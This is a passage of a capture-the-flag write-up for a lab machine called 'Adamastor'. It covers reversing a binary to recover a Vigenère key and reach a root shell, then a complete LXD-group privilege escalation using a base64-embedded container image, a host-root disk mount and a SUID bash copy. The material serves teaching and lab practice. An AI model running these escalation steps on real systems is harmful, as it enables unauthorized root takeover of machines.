  if (sVar2 == -1) {
    perror("[-] Receive failed");
  }
  else if (sVar2 == 0) {
    puts("[-] Connection closed by the server");
  }
  else {
    *(undefined *)((long)param_3 + sVar2) = 0;
  }
  close(__fd);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

The function seems to connect to a server using the two environment variables, receive a string from it that's later used in our program in the `guess_the_cipher_my_friend()` function. Alright let's not go too fast, let's try to fetch the server's info on the target machine:

```bash
luis@adamastor:~$ echo $DATA_DETAILS_01
127.0.0.1
luis@adamastor:~$ echo $DATA_DETAILS_02
888
```
Alright ! It seems we do have enough informations to connect to the server that's runnin on the localhost. To do this, we can use `netcat` like so and we should receive the data:

```bash
luis@adamastor:~$ nc 127.0.0.1 888
TheSuperSecretKeyOfRodeo
```

Bingo ! We can grab this key and keep it for later, it might be useful !!

Alright if we get back on the program we see that this key is actually stored in a variable, called `local_48`. We then used it in the `guess_the_cipher_my_friend()`. But we also got another argument. 
Actually if we take `r2` to check the few instructions before calling the `guess_the_cipher_my_friend()` function we understand pretty quick what is it...

So these are the few lines before the function call:

```C
│ │││││││   0x5616ac604c03      48b8546b6565.  movabs rax, 0x6678687565656b54 ; 'Tkeeuhxf'
│ │││││││   0x5616ac604c0d      48ba6a41636a.  movabs rdx, 0x4a6f61586a63416a ; 'jAcjXaoJ'
│ │││││││   0x5616ac604c17      48894590       mov qword [var_70h], rax
│ │││││││   0x5616ac604c1b      48895598       mov qword [var_68h], rdx
│ │││││││   0x5616ac604c1f      48b86766786b.  movabs rax, 0x486868466b786667 ; 'gfxkFhhH'
│ │││││││   0x5616ac604c29      48ba78687147.  movabs rdx, 0x7276746a47716878 ; 'xhqGjtvr'
│ │││││││   0x5616ac604c33      488945a0       mov qword [var_60h], rax
│ │││││││   0x5616ac604c37      488955a8       mov qword [var_58h], rdx
│ │││││││   0x5616ac604c3b      c745b06c7374.  mov dword [var_50h], 0x74736c ; 'lst'
```

These lines, indicates us that this is actually just a string that's getting split in the assembly instructions but basically, what's getting passed to the function is the ciphered text: `TkeeuhxfjAcjXaoJgfxkFhhHxhqGjtvrlst` and the key `TheSuperSecretKeyOfRodeo` !

Time to guess the cipher !!

If we check the function in `Ghidra`:

```C
char * guess_the_cipher_my_friend(char *param_1,char *param_2)

{
  char cVar1;
  char cVar2;
  int iVar3;
  size_t sVar4;
  size_t sVar5;
  ushort **ppuVar6;
  int local_28;

  sVar4 = strlen(param_1);
  sVar5 = strlen(param_2);
  for (local_28 = 0; local_28 < (int)sVar4; local_28 = local_28 + 1) {
    ppuVar6 = __ctype_b_loc();
    if (((*ppuVar6)[param_1[local_28]] & 0x400) != 0) {
      ppuVar6 = __ctype_b_loc();
      if (((*ppuVar6)[param_1[local_28]] & 0x200) == 0) {
        cVar2 = 'A';
      }
      else {
        cVar2 = 'a';
      }
      cVar1 = param_1[local_28];
      iVar3 = tolower((int)param_2[local_28 % (int)sVar5]);
      param_1[local_28] =
           (char)(((((int)cVar1 - (int)cVar2) - (iVar3 + -0x61)) + 0x1a) % 0x1a) + cVar2;
    }
  }
  return param_1;
}
```

We notice a few things here, the function seems to check the length both of the ciphered text and the key with the functions `strlen()` but also using a for loop to iterate over each character. 

On top of this, inside the loop we see multiple checks to respect the lower case / upper case situation of the letters like `a` or `A` but also some hexcode like 0x1a that's actually equivalent in decimal to 26...

If we google something like `cipher 26 key length`. We end up fairly quickly on Vigenere Cipher ! When looking at the Wikipedia article just [here](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher) and checking the function details in `Ghidra` everything makes way more sense!

Wikipedia describe this cipher as: "where each letter of the plaintext is encoded with a different Caesar cipher, whose increment is determined by the corresponding letter of another text, the key."

Alright when all the elements are met, there's different route you can take to get the last challenge, cyberchef or another online tool. I choose python by building a script:

```python
def vigenere_decrypt(ciphertext, key):
    """
    Description:
        Decrypts a ciphertext using the Vigenère cipher with the given key.
        Preserves the case of letters in the decrypted text.
    Parameters:
        ciphertext (str): The text to be decrypted.
        key (str): The key used for decryption.
    Returns:
        str: The decrypted plaintext.
    """
    decrypted_text = ""
    key_length = len(key)
    for i, c in enumerate(ciphertext):
        if c.isalpha():
            shift = ord(key[i % key_length].lower()) - ord('a')
            decrypted_char = chr((ord(c.lower()) - ord('a') - shift) % 26 + ord('a'))
            decrypted_text += decrypted_char.upper() if c.isupper() else decrypted_char
        else:
            decrypted_text += c
    return decrypted_text

if __name__ == "__main__":
    # Example usage:
    ciphertext = "TkeeuhxfjAcjXaoJgfxkFhhHxhqGjtvrlst"
    key = "TheSuperSecretKeyOfRodeo"
    decrypted_text = vigenere_decrypt(ciphertext, key)
    print("Decrypted text:", decrypted_text)
```

When executing it:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 Vigenere_Decrypt.py 
Decrypted text: AdamastorWasTheFirstRedTeamOperator
```

Alright we got our last flag, let's check on the target machine if everything works out !

```
luis@adamastor:~$ ./adamastor cc99e897
[+] Congratulations! You've passed the XOR challenge.
[*] Now, provide an input for the second challenge: 8vhKtdCTPw
[+] Well done! You've passed the obfuscation challenge.
[*] Finally, provide an input for the last challenge: AdamastorWasTheFirstRedTeamOperator
[+] Well done! You've passed the final challenge!
[+] Finally you've arrived ! Welcome to the Cape of Good Hope: 
# id
uid=0(root) gid=1000(luis) groups=1000(luis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)
# ls /root
server.py  snap
# cat /root/server.py
"""List of imported modules"""
import socket

def start_server(host, port):
    """
    Description:
        Create a server that listen for incoming connection, 
        When a client connect, send them the vigenere key we used for the last chall
    Parameters:
        HOST (CONST str): IP address our server is going to listen on (localhost)
        PORT (CONST int): PORT our server is going to listen on (888)
    Returns:
        N/A
    """
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)

    print(f"Server listening on {host}:{port}")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Connection from {client_address}")
        client_socket.sendall(b'TheSuperSecretKeyOfRodeo')
        client_socket.close()

if __name__ == "__main__":
    HOST = "127.0.0.1"
    PORT = 888

    start_server(HOST, PORT)
# exit
⠀⠀⠀⠈⠉⠛⢷⣦⡀⠀⣀⣠⣤⠤⠄
⠀⠀⠀⠀⠀⣀⣻⣿⣿⣿⣋⣀⡀⠀⠀⢀⣠⣤⣄⡀
⠀⠀⠀⣠⠾⠛⠛⢻⣿⣿⣿⠟⠛⠛⠓⠢⠀⠀⠉⢿⣿⣆⣀⣠⣤⣀⣀
⠀⠀⠘⠁⠀⠀⣰⡿⠛⠿⠿⣧⡀⠀⠀⢀⣤⣤⣤⣼⣿⣿⣿⡿⠟⠋⠉⠉
⠀⠀⠀⠀⠀⠠⠋⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠹⣿⣿⣿⠟⠻⢶⣄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⠀⠀⠀⠀⢠⡿⠁   ⠀⠀⠀⠈
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡄⠀⠀⢠⡟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⣾⠁
⠀⣤⣤⣤⣤⣤⣤⡤⠄⠀⠀⣀⡀⢸⡇⢠⣤⣁⣀⠀⠀⠠⢤⣤⣤⣤⣤⣤⣤
⠀⠀⠀⠀⠀⠀⣀⣤⣶⣾⣿⣿⣷⣤⣤⣾⣿⣿⣿⣿⣷⣶⣤⣀
⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄
⠀⠀⠼⠿⣿⣿⠿⠛⠉⠉⠉⠙⠛⠿⣿⣿⠿⠛⠛⠛⠛⠿⢿⣿⣿⠿⠿⠇
⠀⢶⣤⣀⣀⣠⣴⠶⠛⠋⠙⠻⣦⣄⣀⣀⣠⣤⣴⠶⠶⣦⣄⣀⣀⣠⣤⣤⡶
⠀⠀⠈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠀⠀⠀⠀⠀⠉⠉⠉⠉
      [*] Costa Rica...
```

The `adamastor` binary deliver us a fully functionnal root shell, we were able to confirm the takeover by executing `id` as root ! We're also able to read files in /root directory, but also to see the small easter egg ! 

## Privilege escalation (A's way, all credit goes to him!)

### Enumerating / Finding the other way around

First step let's get on a temporary, hidden directory to do our work:

```bash
luis@adamastor:~$ mkdir /tmp/.elm && cd /tmp/.elm && pwd
/tmp/.elm
luis@adamastor:/tmp/.elm$
```

Then let's enumerate either,

manually:

```bash
luis@adamastor:/tmp/.elm$ id
uid=1000(luis) gid=1000(luis) groups=1000(luis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)
```

or automatically (`linpeas.sh` should flag in the Basic Information section `lxd` group as `RED/YELLOW: 95% a PE vector`):

```bash
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 5.15.0-101-generic (buildd@lcy02-amd64-032) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
User & Groups: uid=1000(luis) gid=1000(luis) groups=1000(luis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)
Hostname: adamastor
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
```

Okay now that we know that `lxd` might be a privesc vector what do we do ? Well we google around of course ! 

We have two good ressources that we will use to privesc through `lxd`:

- https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation#exploiting-without-internet

### Exploiting `lxd`

First step for us will be to initialize lxd with default options, by hitting enter multiple times. It should technically be the first time being used on the box, allegedly the output should look like this:

```bash
luis@adamastor:/tmp/.elm$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: 
Name of the storage backend to use (cephobject, dir, lvm, zfs, btrfs, ceph) [default=zfs]: 
Create a new ZFS pool? (yes/no) [default=yes]: 
Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]: 
Size in GiB of the new loop device (1GiB minimum) [default=5GiB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like the LXD server to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes]: 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
```

If you see this line in the output when running `lxd init`:

```bash
luis@adamastor:/tmp/.elm$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: 
The requested storage pool "default" already exists. Please choose another name.
```

That means `lxd` has already been initialized, you can just skip to the next step !

Next step now to make this work, since we don't have network connectivity per say on the machine, we need to use a base64 string that will store our `offline` image (check the first link to learn more about how it was created, basically to quote the author *"The easiest solution to this is to create your own image and upload that via an appropriate technique such as writing a base64 encoded file using echo and then decoding it; and one of the best of these is to use is a busybox template."*). So when applying the technique displayed in the article in the first link, it should look like this:

```bash
luis@adamastor:/tmp/.elm$ echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > elm.tar.bz2
luis@adamastor:/tmp/.elm$ ls -latr
total 856
-rwxrwxr-x  1 luis luis 860549 Apr  1 19:14 linpeas.sh
drwxrwxrwt 15 root root   4096 Apr  1 19:39 ..
-rw-rw-r--  1 luis luis    656 Apr  1 19:43 elm.tar.bz2
drwxrwxr-x  2 luis luis   4096 Apr  1 19:43 .
```
Next for us will be to import the image we just wrote in a file on the target machine like so:

```bash
luis@adamastor:/tmp/.elm$ lxc image import elm.tar.bz2 --alias elmImage
Image imported with fingerprint: 8961bb8704bc3fd43269c88f8103cab4fccd55325dd45f98e3ec7c75e501051d
luis@adamastor:/tmp/.elm$ lxc image list
+----------+--------------+--------+-------------+--------------+-----------+---------+-----------------------------+
|  ALIAS   | FINGERPRINT  | PUBLIC | DESCRIPTION | ARCHITECTURE |   TYPE    |  SIZE   |         UPLOAD DATE         |
+----------+--------------+--------+-------------+--------------+-----------+---------+-----------------------------+
| elmImage | 8961bb8704bc | no     |             | x86_64       | CONTAINER | 0.00MiB | Apr 1, 2024 at 7:47pm (UTC) |
+----------+--------------+--------+-------------+--------------+-----------+---------+-----------------------------+
```

If you got an output like this when executing the command above:

```bash
luis@adamastor:/tmp/.elm$ lxc image import elm.tar.bz2 --alias elmImage
Error: Image with same fingerprint already exists
```

It means the image you tried to import is already there since they found another one with the same signature in the `lxc` environment. What you can do from here is delete the image present on the system by doing `lxc image list` (to find the name of the image to delete), then simply do: `lxc image delete IMAGE_NAME`. Now you should be able to go back to the step above and load your image !

When this is done, we can create a container out of the image like this:

First step will be to initialize our container (`elmContainer`) using the image (`elmImage`) we just created, without forgetting to set the `security.privileged` flag to `true`!:

```bash
luis@adamastor:/tmp/.elm$ lxc init elmImage elmContainer -c security.privileged=true
Creating elmContainer
luis@adamastor:/tmp/.elm$ lxc list
+--------------+---------+------+------+-----------+-----------+
|     NAME     |  STATE  | IPV4 | IPV6 |   TYPE    | SNAPSHOTS |
+--------------+---------+------+------+-----------+-----------+
| elmContainer | STOPPED |      |      | CONTAINER | 0         |
+--------------+---------+------+------+-----------+-----------+
```

Next we will configure our container to connect our disk (`host-root` is just the handle name we use, basically allowing us to take everything from the path `/` and everything under on the actual target machine) to a folder in our container called `r` (don't change the name of the path from `r` to anything else, the image we used to build this container will only accept this name, if you do change the path name, the container won't start later!):

```bash
luis@adamastor:/tmp/.elm$ lxc config device add elmContainer host-root disk source=/ path=r recursive=true
Device host-root added to elmContainer
```

Now that this is done, we can start `elmContainer` like so:

```bash
luis@adamastor:/tmp/.elm$ lxc start elmContainer 
luis@adamastor:/tmp/.elm$ lxc list
+--------------+---------+------+-----------------------------------------------+-----------+-----------+
|     NAME     |  STATE  | IPV4 |                     IPV6                      |   TYPE    | SNAPSHOTS |
+--------------+---------+------+-----------------------------------------------+-----------+-----------+
| elmContainer | RUNNING |      | fd42:27f1:4317:fcfb:216:3eff:fee4:bb2e (eth0) | CONTAINER | 0         |
+--------------+---------+------+-----------------------------------------------+-----------+-----------+
```

Now that the container is running, our final step will be to execute a shell like this:

```bash
luis@adamastor:/tmp/.elm$ lxc exec elmContainer /bin/bash
bash-5.1# id
uid=0(root) gid=0(root) groups=0(root)
```

Bingo we're almost done, the final step to gain full control of `Adamastor` will be to do something like this:

(multiple ways to do this, you choose, you could put your `ssh` public key in the `authorized_keys` file of `root` or also create a bash `SUID` binary in your `/tmp` folder, your call, there's a ton of ways to gain full control, for this exemple we will go the bash `SUID` binary route !)


```bash
bash-5.1# ls -latr /
total 13
drwxr-xr-x   3 root root    3 Oct 16  2018 var
drwxr-xr-x   2 root root    2 Oct 16  2018 tmp
drwxr-xr-x   3 root root    8 Oct 16  2018 etc
drwxr-xr-x   2 root root    3 Oct 16  2018 sbin
lrwxrwxrwx   1 root root    7 Oct 16  2018 usr -> ./r/usr
lrwxrwxrwx   1 root root    9 Oct 16  2018 lib64 -> ./r/lib64
lrwxrwxrwx   1 root root    7 Oct 16  2018 lib -> ./r/lib
lrwxrwxrwx   1 root root    7 Oct 16  2018 bin -> ./r/bin
drwxr-xr-x  20 root root 4096 Mar 19 19:16 r
dr-xr-xr-x  13 root root    0 Apr  1 21:03 sys
dr-xr-xr-x 260 root root    0 Apr  1 21:03 proc
drwxr-xr-x  11 root root   15 Apr  1 21:03 ..
drwxr-xr-x  11 root root   15 Apr  1 21:03 .
drwxr-xr-x   7 root root  420 Apr  1 21:03 dev
drwxr-xr-x   2 root root    3 Apr  1 21:06 root
bash-5.1# cd /r && ls -latr
total 78
lrwxrwxrwx   1 root root     8 Feb 16 18:37 sbin -> usr/sbin
lrwxrwxrwx   1 root root    10 Feb 16 18:37 libx32 -> usr/libx32
lrwxrwxrwx   1 root root     9 Feb 16 18:37 lib64 -> usr/lib64
lrwxrwxrwx   1 root root     9 Feb 16 18:37 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     7 Feb 16 18:37 lib -> usr/lib
lrwxrwxrwx   1 root root     7 Feb 16 18:37 bin -> usr/bin
drwxr-xr-x  14 root root  4096 Feb 16 18:37 usr
drwxr-xr-x   2 root root  4096 Feb 16 18:37 srv
drwxr-xr-x   2 root root  4096 Feb 16 18:37 opt
drwxr-xr-x   2 root root  4096 Feb 16 18:37 mnt
drwxr-xr-x   6 root root  4096 Feb 16 18:52 snap
dr-xr-xr-x   2 root root  4096 Feb 16 23:52 cdrom
drwx------   2 root root 16384 Mar 19 18:49 lost+found
drwxr-xr-x   4 root root  4096 Mar 19 18:50 boot
drwxr-xr-x   3 root root  4096 Mar 19 18:52 home
drwxr-xr-x  14 root root  4096 Mar 19 19:12 var
-rw-r--r--   1 root root    50 Mar 19 19:16 t4k3_th1s_p4ssw0rd_l4st_34sy_th1ng_y0ull_s33_before_g01ng_NUTS.txt
drwxr-xr-x  20 root root  4096 Mar 19 19:16 .
drwx------   5 root root  4096 Mar 19 19:18 root
drwxr-xr-x  99 root root  4096 Mar 19 19:39 etc
dr-xr-xr-x  13 root root     0 Apr  1 20:40 sys
dr-xr-xr-x 260 root root     0 Apr  1 20:40 proc
drwxr-xr-x  30 root root   860 Apr  1 20:41 run
drwxr-xr-x   2 root root  4096 Apr  1 20:47 media
drwxr-xr-x  20 root root  4080 Apr  1 20:47 dev
drwxr-xr-x  11 root root    15 Apr  1 21:03 ..
drwxrwxrwt  14 root root  4096 Apr  1 21:09 tmp
bash-5.1# cp ./bin/bash ./tmp/.elm/bash && chmod +s ./tmp/.elm/bash
bash-5.1# ls -latr ./tmp/.elm/
total 1376
-rw-rw-r--  1 1000 1000     656 Apr  1 20:46 elm.tar.bz2
drwxrwxrwt 14 root root    4096 Apr  1 21:09 ..
drwxrwxr-x  2 1000 1000    4096 Apr  1 21:14 .
-rwsr-sr-x  1 root root 1396520 Apr  1 21:14 bash
```

Okay now that we got our `SUID` bash program in our folder, let's get out of the container and execute this binary !!!

```bash
bash-5.1# exit
exit
luis@adamastor:/tmp/.elm$ ./bash -p
bash-5.1# id
uid=1000(luis) gid=1000(luis) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),1000(luis)
```

Bingo ! Congratz, we've rooted the machine with A's way ! :)

One last nice step you can take is actually cleaning up the `lxc` environment to remove your image / container just in case someone play after you, you can do so like this:

```bash
luis@adamastor:/tmp/.elm$ lxc list
+--------------+---------+------+-----------------------------------------------+-----------+-----------+
|     NAME     |  STATE  | IPV4 |                     IPV6                      |   TYPE    | SNAPSHOTS |
+--------------+---------+------+-----------------------------------------------+-----------+-----------+
| elmContainer | RUNNING |      | fd42:27f1:4317:fcfb:216:3eff:feb3:2e40 (eth0) | CONTAINER | 0         |
+--------------+---------+------+-----------------------------------------------+-----------+-----------+
luis@adamastor:/tmp/.elm$ lxc stop elmContainer 
luis@adamastor:/tmp/.elm$ lxc list
+--------------+---------+------+------+-----------+-----------+
|     NAME     |  STATE  | IPV4 | IPV6 |   TYPE    | SNAPSHOTS |
+--------------+---------+------+------+-----------+-----------+
| elmContainer | STOPPED |      |      | CONTAINER | 0         |
+--------------+---------+------+------+-----------+-----------+
luis@adamastor:/tmp/.elm$ lxc delete elmContainer 
luis@adamastor:/tmp/.elm$ lxc image list
+----------+--------------+--------+-------------+--------------+-----------+---------+-----------------------------+
|  ALIAS   | FINGERPRINT  | PUBLIC | DESCRIPTION | ARCHITECTURE |   TYPE    |  SIZE   |         UPLOAD DATE         |
+----------+--------------+--------+-------------+--------------+-----------+---------+-----------------------------+
| elmImage | 8961bb8704bc | no     |             | x86_64       | CONTAINER | 0.00MiB | Apr 1, 2024 at 8:47pm (UTC) |
+----------+--------------+--------+-------------+--------------+-----------+---------+-----------------------------+
luis@adamastor:/tmp/.elm$ lxc image delete elmImage
luis@adamastor:/tmp/.elm$ lxc image list
+-------+-------------+--------+-------------+--------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCHITECTURE | TYPE | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+--------------+------+------+-------------+
```

Now we're really finished !!

Alright, thanks to A again for this other way around, at least we will have two pathways we can take during our privilege escalation process to complete the machine!

That was quite a fun box to create / do, hope you enjoyed it, we've reached the End Game !!
